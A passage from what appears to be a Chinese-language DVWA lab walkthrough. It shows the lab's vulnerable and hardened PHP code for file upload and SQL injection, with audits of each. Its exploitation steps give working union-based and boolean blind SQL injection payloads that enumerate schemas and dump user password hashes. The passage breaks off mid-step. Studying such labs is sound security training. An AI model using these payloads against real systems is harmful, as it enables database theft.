1); </span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'size'</span> ]; </span><br><span class="line">    <span class="variable">$uploaded_type</span> = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'type'</span> ]; </span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">'uploaded'</span> ][ <span class="string">'tmp_name'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Where are we going to be writing to? </span><br><span class="line">    <span class="variable">$target_path</span>   = DVWA_WEB_PAGE_TO_ROOT . <span class="string">'hackable/uploads/'</span>; </span><br><span class="line">    //<span class="variable">$target_file</span>   = basename( <span class="variable">$uploaded_name</span>, <span class="string">'.'</span> . <span class="variable">$uploaded_ext</span> ) . <span class="string">'-'</span>; </span><br><span class="line">    <span class="variable">$target_file</span>   =  md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">'.'</span> . <span class="variable">$uploaded_ext</span>; </span><br><span class="line">    <span class="variable">$temp_file</span>     = ( ( ini_get( <span class="string">'upload_tmp_dir'</span> ) == <span class="string">''</span> ) ? ( sys_get_temp_dir() ) : ( ini_get( <span class="string">'upload_tmp_dir'</span> ) ) ); </span><br><span class="line">    <span class="variable">$temp_file</span>    .= DIRECTORY_SEPARATOR . md5( uniqid() . <span class="variable">$uploaded_name</span> ) . <span class="string">'.'</span> . <span class="variable">$uploaded_ext</span>; </span><br><span class="line"></span><br><span class="line">    // Is it an image? </span><br><span class="line">    <span class="keyword">if</span>( ( strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">'jpg'</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">'jpeg'</span> || strtolower( <span class="variable">$uploaded_ext</span> ) == <span class="string">'png'</span> ) &amp;&amp; </span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; 100000 ) &amp;&amp; </span><br><span class="line">        ( <span class="variable">$uploaded_type</span> == <span class="string">'image/jpeg'</span> || <span class="variable">$uploaded_type</span> == <span class="string">'image/png'</span> ) &amp;&amp; </span><br><span class="line">        getimagesize( <span class="variable">$uploaded_tmp</span> ) ) &#123; </span><br><span class="line"></span><br><span class="line">        // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) </span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$uploaded_type</span> == <span class="string">'image/jpeg'</span> ) &#123; </span><br><span class="line">            <span class="variable">$img</span> = imagecreatefromjpeg( <span class="variable">$uploaded_tmp</span> ); </span><br><span class="line">            imagejpeg( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, 100); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="variable">$img</span> = imagecreatefrompng( <span class="variable">$uploaded_tmp</span> ); </span><br><span class="line">            imagepng( <span class="variable">$img</span>, <span class="variable">$temp_file</span>, 9); </span><br><span class="line">        &#125; </span><br><span class="line">        imagedestroy( <span class="variable">$img</span> ); </span><br><span class="line"></span><br><span class="line">        // Can we move the file to the web root from the temp folder? </span><br><span class="line">        <span class="keyword">if</span>( rename( <span class="variable">$temp_file</span>, ( getcwd() . DIRECTORY_SEPARATOR . <span class="variable">$target_path</span> . <span class="variable">$target_file</span> ) ) ) &#123; </span><br><span class="line">            // Yes! </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;&lt;a href='<span class="variable">$&#123;target_path&#125;</span><span class="variable">$&#123;target_file&#125;</span>'&gt;<span class="variable">$&#123;target_file&#125;</span>&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            // No </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>; </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        // Delete any temp files </span><br><span class="line">        <span class="keyword">if</span>( file_exists( <span class="variable">$temp_file</span> ) ) </span><br><span class="line">            unlink( <span class="variable">$temp_file</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // Invalid file </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-13"><a href="#审计-13" class="headerlink" title="审计"></a>审计</h4><p>Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件，同时不返回文件路径以及文件名字，无懈可击。</p><h2 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h2><p>SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。SQL注入漏洞的危害是巨大的，常常会导致整个数据库被“脱裤”，尽管如此，SQL注入仍是现在最常见的Web漏洞之一。近期很火的大使馆接连被黑事件，据说黑客依靠的就是常见的SQL注入漏洞。</p><h3 id="手工注入思路"><a href="#手工注入思路" class="headerlink" title="手工注入思路"></a>手工注入思路</h3><p>sqlmap大家应该都知道，自动化注入神器，但是我们还是需要掌握手工注入，下面介绍手工注入的思路及步骤</p><blockquote><p>1.判断是否存在注入，注入是字符型还是数字型<br>   2.猜解SQL查询语句中的字段数<br>   3.确定显示的字段顺序<br>   4.获取当前数据库<br>   5.获取数据库中的表<br>   6.获取表中的字段名<br>   7.下载数据</p></blockquote><h3 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_REQUEST</span>[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="variable">$id</span>';"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) or die( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    <span class="variable">$num</span> = mysql_numrows( <span class="variable">$result</span> ); </span><br><span class="line">    <span class="variable">$i</span>   = 0; </span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$i</span> &lt; <span class="variable">$num</span> ) &#123; </span><br><span class="line">        // Get values </span><br><span class="line">        <span class="variable">$first</span> = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"first_name"</span> ); </span><br><span class="line">        <span class="variable">$last</span>  = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;<span class="variable">$id</span>&#125;&lt;br /&gt;First name: &#123;<span class="variable">$first</span>&#125;&lt;br /&gt;Surname: &#123;<span class="variable">$last</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        // Increase loop count </span><br><span class="line">        <span class="variable">$i</span>++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-14"><a href="#审计-14" class="headerlink" title="审计"></a>审计</h4><p>Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。</p><h4 id="漏洞利用-11"><a href="#漏洞利用-11" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>在现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码基础上。</p><ul><li><p>判断是否存在注入，注入是字符型还是数字型<br><img src="sqlinjection01.png" alt=""><br><img src="sqlinjection02.png" alt=""><br>可以判断是存在字符型注入</p></li><li><p>猜解SQL查询语句中的字段数<br>输入1’ or 1=1 order by 1 #，查询成功：<br><img src="sqlinjection03.png" alt=""><br>依次尝试，发现在 order by 3的时候<br>输入1’ or 1=1 order by 3 #，查询失败：<br><img src="sqlinjection04.png" alt=""><br>说明执行的SQL查询语句中只有两个字段，即这里的First name、Surname。</p></li><li><p>确定显示的字段顺序<br>输入1’ union select 1,2 #，查询成功：<br><img src="sqlinjection05.png" alt=""><br>确定字段是First name,Surname。</p></li><li><p>获取当前数据库<br>输入1’ union select 1,database() #，查询成功：<br><img src="sqlinjection06.png" alt=""><br>可以知道数据名字是dvwa</p></li><li><p>获取数据库中的表<br>输入1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #，查询成功：<br><img src="sqlinjection08.png" alt=""></p></li><li><p>获取表中的字段名<br>输入1’ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #，查询成功：<br><img src="sqlinjection09.png" alt=""><br>users表中有8个字段，分别是user_id,first_name,last_name,user,password,avatar,last_login,failed_login。</p></li><li><p>下载数据<br>输入1’ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #，查询成功：<br>!<img src="sqlinjection11.png" alt=""><br>users表中所有用户的user_id,first_name,last_name,password的数据</p></li></ul><h3 id="Medium-5"><a href="#Medium-5" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_POST</span>[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">'id'</span> ]; </span><br><span class="line">    <span class="variable">$id</span> = mysql_real_escape_string( <span class="variable">$id</span> ); </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = <span class="variable">$id</span>;"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) or die( <span class="string">'&lt;pre&gt;'</span> . mysql_error() . <span class="string">'&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    <span class="variable">$num</span> = mysql_numrows( <span class="variable">$result</span> ); </span><br><span class="line">    <span class="variable">$i</span>   = 0; </span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$i</span> &lt; <span class="variable">$num</span> ) &#123; </span><br><span class="line">        // Display values </span><br><span class="line">        <span class="variable">$first</span> = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"first_name"</span> ); </span><br><span class="line">        <span class="variable">$last</span>  = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;<span class="variable">$id</span>&#125;&lt;br /&gt;First name: &#123;<span class="variable">$first</span>&#125;&lt;br /&gt;Surname: &#123;<span class="variable">$last</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        // Increase loop count </span><br><span class="line">        <span class="variable">$i</span>++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    //mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-15"><a href="#审计-15" class="headerlink" title="审计"></a>审计</h4><p>Medium级别的代码利用mysql_real_escape_string函数对特殊符号<br>\x00,\n,\r,\,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入</p><h4 id="漏洞利用-12"><a href="#漏洞利用-12" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>虽然利用表单控制用户的输入，但是我们可以通过抓包改参数，提交我们构造的查询参数。</p><ul><li>判断是否存在注入，注入是字符型还是数字型</li></ul><p><img src="sqlinjection12.png" alt=""><br>报错:<br><img src="sqlinjection13.png" alt=""><br>抓包更改参数id为1 or 1=1 #，查询成功：<br><img src="sqlinjection14.png" alt=""></p><p>由于是数字型注入，服务器端的mysql_real_escape_string函数就形同虚设了，因为数字型注入并不需要借助引号。直接绕过</p><p>其他操作跟low级别得到漏洞利用差不多，只不多是抓包更改参数而已。这里就不赘述了。</p><p>如果想要绕过单引号转义过滤，可以将字符串转为16进制编码数据或使用char函数(十进制)进行转化(因为数据库会自动把16进制转化)</p><h3 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_SESSION</span> [ <span class="string">'id'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = <span class="variable">$id</span> LIMIT 1;"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) or die( <span class="string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> ); </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    <span class="variable">$num</span> = mysql_numrows( <span class="variable">$result</span> ); </span><br><span class="line">    <span class="variable">$i</span>   = 0; </span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$i</span> &lt; <span class="variable">$num</span> ) &#123; </span><br><span class="line">        // Get values </span><br><span class="line">        <span class="variable">$first</span> = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"first_name"</span> ); </span><br><span class="line">        <span class="variable">$last</span>  = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">"last_name"</span> ); </span><br><span class="line"></span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;<span class="variable">$id</span>&#125;&lt;br /&gt;First name: &#123;<span class="variable">$first</span>&#125;&lt;br /&gt;Surname: &#123;<span class="variable">$last</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line"></span><br><span class="line">        // Increase loop count </span><br><span class="line">        <span class="variable">$i</span>++; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-16"><a href="#审计-16" class="headerlink" title="审计"></a>审计</h4><p>与Medium级别的代码相比，High级别的只是在SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果</p><h4 id="漏洞利用-13"><a href="#漏洞利用-13" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。由于手工注入的过程与Low级别基本一样，这里不再演示，可看low级别的漏洞利用。<br>需要特别提到的是，High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入，如下如所示:</p><p><img src="sqlinjection16.png" alt=""><br><img src="sqlinjection17.png" alt=""></p><h3 id="Impossible-5"><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_GET</span>[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    // Check Anti-CSRF token </span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">'user_token'</span> ], <span class="variable">$_SESSION</span>[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> ); </span><br><span class="line"></span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Was a number entered? </span><br><span class="line">    <span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123; </span><br><span class="line">        // Check the database </span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">':id'</span>, <span class="variable">$id</span>, PDO::PARAM_INT ); </span><br><span class="line">        <span class="variable">$data</span>-&gt;execute(); </span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch(); </span><br><span class="line"></span><br><span class="line">        // Make sure only 1 result is returned </span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == 1 ) &#123; </span><br><span class="line">            // Get values </span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">'first_name'</span> ]; </span><br><span class="line">            <span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">'last_name'</span> ]; </span><br><span class="line"></span><br><span class="line">            // Feedback <span class="keyword">for</span> end user </span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"&lt;pre&gt;ID: &#123;<span class="variable">$id</span>&#125;&lt;br /&gt;First name: &#123;<span class="variable">$first</span>&#125;&lt;br /&gt;Surname: &#123;<span class="variable">$last</span>&#125;&lt;/pre&gt;"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token </span><br><span class="line">generateSessionToken(); </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-17"><a href="#审计-17" class="headerlink" title="审计"></a>审计</h4><p>Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。</p><h2 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h2><p>盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p><h3 id="手工盲注思路"><a href="#手工盲注思路" class="headerlink" title="手工盲注思路"></a>手工盲注思路</h3><p>手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。</p><p>盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注，这里由于实验环境的限制，只演示基于布尔的盲注与基于时间的盲注。</p><p>下面简要介绍手工盲注的步骤（可与之前的手工注入作比较）：</p><blockquote><p>1.判断是否存在注入，注入是字符型还是数字型<br>2.猜解当前数据库名<br>3.猜解数据库中的表名<br>4.猜解表中的字段名<br>5.猜解数据</p></blockquote><h3 id="Low-4"><a href="#Low-4" class="headerlink" title="Low"></a>Low</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( isset( <span class="variable">$_GET</span>[ <span class="string">'Submit'</span> ] ) ) &#123; </span><br><span class="line">    // Get input </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">'id'</span> ]; </span><br><span class="line"></span><br><span class="line">    // Check database </span><br><span class="line">    <span class="variable">$getid</span>  = <span class="string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="variable">$id</span>';"</span>; </span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$getid</span> ); // Removed <span class="string">'or die'</span> to suppress mysql errors </span><br><span class="line"></span><br><span class="line">    // Get results </span><br><span class="line">    <span class="variable">$num</span> = @mysql_numrows( <span class="variable">$result</span> ); // The <span class="string">'@'</span> character suppresses errors </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$num</span> &gt; 0 ) &#123; </span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        // User wasn<span class="string">'t found, so the page wasn'</span>t! </span><br><span class="line">        header( <span class="variable">$_SERVER</span>[ <span class="string">'SERVER_PROTOCOL'</span> ] . <span class="string">' 404 Not Found'</span> ); </span><br><span class="line"></span><br><span class="line">        // Feedback <span class="keyword">for</span> end user </span><br><span class="line">        <span class="built_in">echo</span> <span class="string">'&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;'</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    mysql_close(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="审计-18"><a href="#审计-18" class="headerlink" title="审计"></a>审计</h4><p>可以看到，Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种，‘</p><pre><code>User ID exists in the database.</code></pre><p>‘与‘</p><p><code>User ID is MISSING from the database.</code></p><p>因此这里是SQL盲注漏洞。</p><h4 id="漏洞利用-14"><a href="#漏洞利用-14" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul><li>判断是否存在注入，注入是字符型还是数字型<br>输入1，显示相应用户存在：</li></ul><p><img src="sqlinjection21.png" alt=""></p><p>输入1’ and 1=1 #，显示存在：</p><p><img src="sqlinjection22.png" alt=""></p><p>输入1’ and 1=2 #，显示不存在：</p><p><img src="sqlinjection23.png" alt=""></p><ul><li>猜解当前数据库名</li></ul><p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p><p>输入1’ and length(database())=1 #，显示不存在；</p><p>输入1’ and length(database())=2 #，显示不存在；</p><p>输入1’ and length(database())=3 #，显示不存在；</p><p>输入1’ and length(database())=4 #，显示存在：</p><p>说明数据库名长度为4。</p><p>下面采用二分法猜解数据库名。</p><p>输入1’ and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</p><p>输入1’ and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</p><p>输入1’ and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；</p><p>输入1’ and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；</p><p>输入1’ and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；</p><p>输入1’ and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。</p><p>…</p><p>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。<br>盲注果然费心费力。</p><ul><li>猜解数据库中的表名<br>首先猜解数据库中表的数量：</li></ul><p>1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在</p><p>1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在</p><p>说明数据库中共有两个表。</p><p>接着挨个猜解表名：</p><p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在</p><p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在</p><p>…</p><p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在</p><p>说明第一个表名长度为9。</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 # 显示不存在</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 # 显示不存在</p><p>说明第一个表的名字的第一个字符为小写字母g。</p><p>…</p><p>重复上述步骤，即可猜解出两个表名（guestbook、users）。</p><p>如果不借助工具的话，盲注是一个很大的过程。</p><ul><li>猜解表中的字段名<br>首先猜解表中字段的数量：</li></ul><p>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在</p><p>…</p><p>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在</p><p>说明users表有8个字段。</p><p>接着挨个猜解字段名：</p><p>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在</p><p>…</p><p>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 